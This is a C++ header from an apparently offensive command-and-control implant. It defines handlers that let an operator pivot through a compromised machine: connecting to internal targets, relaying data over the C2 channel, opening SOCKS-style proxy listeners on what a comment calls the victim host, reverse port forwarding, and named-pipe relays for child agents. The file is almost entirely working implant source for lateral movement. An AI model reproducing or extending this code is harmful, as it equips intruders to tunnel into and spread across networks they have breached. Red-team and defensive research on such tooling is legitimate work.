#pragma once
#include "Core/Command/Handlers/IHandler.hpp"
#include "Core/Identity/SessionIdentity.hpp"
#include "Components/Pivot/PivotManager.hpp"
#include "Components/Pivot/PivotEntry.hpp"
#include "Components/Pivot/PipeSessionHub.hpp"
#include "Components/Pivot/RportfwdManager.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"
#include "Common/Protocol/Packet.hpp"

#include <cstdint>
#include <vector>

namespace cleat {


    class PivotStartHandler : public IHandler {
    public:
        nlohmann::json Execute(const CommandRequest& req) override {
            auto itId = req.params.find("pivot_id");
            auto itHost = req.params.find("target_host");
            auto itPort = req.params.find("target_port");
            if (itId == req.params.end() || !itId->is_string() ||
                itHost == req.params.end() || !itHost->is_string() ||
                itPort == req.params.end() || !itPort->is_number()) {
                return Packet::Error("Missing required parameters: pivot_id, target_host, target_port");
            }
            std::string pivot_id = itId->get<std::string>();
            std::string host = itHost->get<std::string>();
            uint16_t port = static_cast<uint16_t>(itPort->get<int>());

            if (!PivotManager::Instance().StartPivot(pivot_id, host, port)) {
                CLEAT_LOGE(ErrDom::Piv, ErrCode::PlatformApiFailed,
                    "PivotStartHandler: connect target failed " << host << ":" << port);
                return Packet::Error("Failed to connect target");
            }
            return Packet::Ok({{"pivot_id", pivot_id}, {"message", "Pivot established"}});
        }
        /// 故它的独占身份是**实例**而不是端口 —— 实测修正了"一律按端口"的初始设想。
        ResourceKey ResourceOf(const CommandRequest& req) const override {
            const auto it = req.params.find("pivot_id");
            if (it == req.params.end()) return ResourceKey{};
            const std::string id = it->is_string() ? it->get<std::string>() : it->dump();
            if (id.empty()) return ResourceKey{};
            return ResourceKey{ ResourceKind::Pivot, "instance:" + id };
        }
    };


    class PivotDataHandler : public IHandler {
    public:
        // 数据透传帧不发响应(CommandProcessor 对 null 响应静默): 每块数据
        // 回一个 Ok 会让上行帧数翻倍且污染 beacon outbox。失败时本地关闭该
        // pivot 并推送 PivotClose 通告 Server(Server 收到后关 SOCKS 客户端),
        // 同样静默——错误响应在 pivot 已死时只会逐块刷帧。
        // sess- 前缀 = 会话借道流量(P1'), 分流给 PipeSessionHub 写管道,
        // 失败静默(入口不存在/断线由 TS 侧按会话关闭处理, 不逐块报错)。
        nlohmann::json Execute(const CommandRequest& req) override {
            auto itId = req.params.find("pivot_id");
            if (itId == req.params.end() || !itId->is_string()) {
                return Packet::Error("Missing 'pivot_id'");
            }
            std::string pivot_id = itId->get<std::string>();
            if (req.payload.empty()) {
                return nlohmann::json();
            }
            if (PipeSessionHub::IsSessionId(pivot_id)) {
                if (!PipeSessionHub::Instance().WriteToSession(pivot_id, req.payload)) {
                    LOG_WARN("PivotDataHandler: 会话入口不存在/未连接 " << pivot_id);
                }
                return nlohmann::json();
            }
            if (!PivotManager::Instance().WriteToTarget(pivot_id, req.payload)) {
                PivotManager::Instance().CloseAndNotify(pivot_id, "write failed or pivot gone");
            }
            return nlohmann::json();
        }
    };


    class PivotCloseHandler : public IHandler {
    public:
        nlohmann::json Execute(const CommandRequest& req) override {
            auto itId = req.params.find("pivot_id");
            if (itId == req.params.end() || !itId->is_string()) {
                return Packet::Error("Missing 'pivot_id'");
            }
            std::string pivot_id = itId->get<std::string>();
            std::string reason = "server closed";
            auto itReason = req.params.find("reason");
            if (itReason != req.params.end() && itReason->is_string()) {
                reason = itReason->get<std::string>();
            }
            PivotManager::Instance().ClosePivot(pivot_id, reason);
            return Packet::Ok({{"pivot_id", pivot_id}, {"message", "Pivot closed"}});
        }

        /// 这条语义完整: Start 被遗弃(超时)时, Close 不该并发去关一个还没建好的东西。
        ResourceKey ResourceOf(const CommandRequest& req) const override {
            const auto it = req.params.find("pivot_id");
            if (it == req.params.end()) return ResourceKey{};
            const std::string id = it->is_string() ? it->get<std::string>() : it->dump();
            if (id.empty()) return ResourceKey{};
            return ResourceKey{ ResourceKind::Pivot, "instance:" + id };
        }
    };


    class PivotListenHandler : public IHandler {
    public:
        // req.params: port(必填), user/pass(可选, 配了则要求 RFC1929 鉴权),
        //         bind(可选, 默认: 有凭据=0.0.0.0 供多跳跨机连入; 无凭据=127.0.0.1,
        //         避免在受害主机上开无鉴权代理)
        nlohmann::json Execute(const CommandRequest& req) override {
            auto itPort = req.params.find("port");
            if (itPort == req.params.end() || !itPort->is_number()) {
                return Packet::Error("Missing 'port'");
            }
            uint16_t port = static_cast<uint16_t>(itPort->get<int>());
            std::string user, pass, bind;
            auto itUser = req.params.find("user");
            if (itUser != req.params.end() && itUser->is_string()) user = itUser->get<std::string>();
            auto itPass = req.params.find("pass");
            if (itPass != req.params.end() && itPass->is_string()) pass = itPass->get<std::string>();
            auto itBind = req.params.find("bind");
            if (itBind != req.params.end() && itBind->is_string()) bind = itBind->get<std::string>();
            if (bind.empty()) {
                bind = user.empty() ? "127.0.0.1" : "0.0.0.0";
            }
            if (!PivotEntryInstance().Start(port, bind, user, pass)) {
                return Packet::Error("Failed to listen on port");
            }
            return Packet::Ok({{"port", port}, {"bind", bind},
                {"auth", !user.empty()}, {"message", "Pivot entry listening"}});
        }
        /// 不同端口可并发。端口缺失/0 视为动态分配: 用一个**显式伪 id** 串行化全部动态分配
        /// (不用空 id —— 空 id 在本项目语义里是"未声明 = 不互斥", 那会与意图相反)。
        ResourceKey ResourceOf(const CommandRequest& req) const override {
            const auto it = req.params.find("port");
            if (it == req.params.end() || !it->is_number()) {
                return ResourceKey{ ResourceKind::Pivot, "dynamic" };
            }
            const long p = it->get<long>();
            if (p <= 0) return ResourceKey{ ResourceKind::Pivot, "dynamic" };
            return ResourceKey{ ResourceKind::Pivot, "port:" + std::to_string(p) };
        }
    };


    class PivotRportfwdAddHandler : public IHandler {
    public:
        // 反向端口转发: Agent 上监听 listen_port, 入站连接经 C2 通道送到
        // Server, 由 Server 连到 target_host:target_port。
        nlohmann::json Execute(const CommandRequest& req) override {
            auto itPort = req.params.find("listen_port");
            auto itHost = req.params.find("target_host");
            auto itTport = req.params.find("target_port");
            if (itPort == req.params.end() || !itPort->is_number() ||
                itHost == req.params.end() || !itHost->is_string() ||
                itTport == req.params.end() || !itTport->is_number()) {
                return Packet::Error("Missing required parameters: listen_port, target_host, target_port");
            }
            uint16_t listen_port = static_cast<uint16_t>(itPort->get<int>());
            std::string host = itHost->get<std::string>();
            uint16_t tport = static_cast<uint16_t>(itTport->get<int>());
            uint64_t sid = SessionIdentity::Instance().GetSessionId();
            if (!RportfwdManager::Instance().Start(sid, listen_port, host, tport)) {
                return Packet::Error("Failed to start rportfwd listener");
            }
            return Packet::Ok({{"listen_port", listen_port},
                {"target_host", host}, {"target_port", tport},
                {"message", "Rportfwd listening"}});
        }
        /// 不同端口可并发。端口缺失/0 视为动态分配: 用一个**显式伪 id** 串行化全部动态分配
        /// (不用空 id —— 空 id 在本项目语义里是"未声明 = 不互斥", 那会与意图相反)。
        ResourceKey ResourceOf(const CommandRequest& req) const override {
            const auto it = req.params.find("listen_port");
            if (it == req.params.end() || !it->is_number()) {
                return ResourceKey{ ResourceKind::Pivot, "dynamic" };
            }
            const long p = it->get<long>();
            if (p <= 0) return ResourceKey{ ResourceKind::Pivot, "dynamic" };
            return ResourceKey{ ResourceKind::Pivot, "port:" + std::to_string(p) };
        }
    };


    class PivotRportfwdDelHandler : public IHandler {
    public:
        nlohmann::json Execute(const CommandRequest& req) override {
            auto itPort = req.params.find("listen_port");
            if (itPort == req.params.end() || !itPort->is_number()) {
                return Packet::Error("Missing 'listen_port'");
            }
            uint16_t listen_port = static_cast<uint16_t>(itPort->get<int>());
            if (!RportfwdManager::Instance().Stop(listen_port)) {
                return Packet::Error("Rportfwd listener not found");
            }
            return Packet::Ok({{"listen_port", listen_port},
                {"message", "Rportfwd stopped"}});
        }
        /// 不同端口可并发。端口缺失/0 视为动态分配: 用一个**显式伪 id** 串行化全部动态分配
        /// (不用空 id —— 空 id 在本项目语义里是"未声明 = 不互斥", 那会与意图相反)。
        ResourceKey ResourceOf(const CommandRequest& req) const override {
            const auto it = req.params.find("listen_port");
            if (it == req.params.end() || !it->is_number()) {
                return ResourceKey{ ResourceKind::Pivot, "dynamic" };
            }
            const long p = it->get<long>();
            if (p <= 0) return ResourceKey{ ResourceKind::Pivot, "dynamic" };
            return ResourceKey{ ResourceKind::Pivot, "port:" + std::to_string(p) };
        }
    };


    class PivotListenPipeHandler : public IHandler {
    public:
        // 会话借道入口(P1'): 本机创建 pipe_name 管道等待子 Agent 连入。
        // req.params: pipe_name(必填), key(可选 pre-auth 口令, 空仅限同用户测试)。
        // 入口生命周期跨断线; TS 侧凭据生成后置(设计), 先行支持 CLI/测试直传。
        nlohmann::json Execute(const CommandRequest& req) override {
            auto itName = req.params.find("pipe_name");
            if (itName == req.params.end() || !itName->is_string()
                || itName->get<std::string>().empty()) {
                return Packet::Error("Missing 'pipe_name'");
            }
            std::string pipe_name = itName->get<std::string>();
            std::string key;
            auto itKey = req.params.find("key");
            if (itKey != req.params.end() && itKey->is_string()) {
                key = itKey->get<std::string>();
            }
            if (!PipeSessionHub::Instance().Listen(pipe_name, key)) {
                return Packet::Error("Failed to open session pipe entry");
            }
            return Packet::Ok({{"pipe_name", pipe_name},
                {"auth", !key.empty()}, {"message", "Session pipe entry listening"}});
        }
        /// 冲突身份 = 管道名(同名入口互斥, 与端口语义同构)
        ResourceKey ResourceOf(const CommandRequest& req) const override {
            const auto it = req.params.find("pipe_name");
            if (it == req.params.end() || !it->is_string() || it->get<std::string>().empty()) {
                return ResourceKey{ ResourceKind::Pivot, "dynamic" };
            }
            return ResourceKey{ ResourceKind::Pivot, "pipe:" + it->get<std::string>() };
        }
    };


    class PivotPipeStopHandler : public IHandler {
    public:
        nlohmann::json Execute(const CommandRequest& req) override {
            auto itName = req.params.find("pipe_name");
            if (itName == req.params.end() || !itName->is_string()) {
                return Packet::Error("Missing 'pipe_name'");
            }
            std::string pipe_name = itName->get<std::string>();
            if (!PipeSessionHub::Instance().Stop(pipe_name)) {
                return Packet::Error("Session pipe entry not found");
            }
            return Packet::Ok({{"pipe_name", pipe_name},
                {"message", "Session pipe entry stopped"}});
        }
        ResourceKey ResourceOf(const CommandRequest& req) const override {
            const auto it = req.params.find("pipe_name");
            if (it == req.params.end() || !it->is_string() || it->get<std::string>().empty()) {
                return ResourceKey{ ResourceKind::Pivot, "dynamic" };
            }
            return ResourceKey{ ResourceKind::Pivot, "pipe:" + it->get<std::string>() };
        }
    };

}
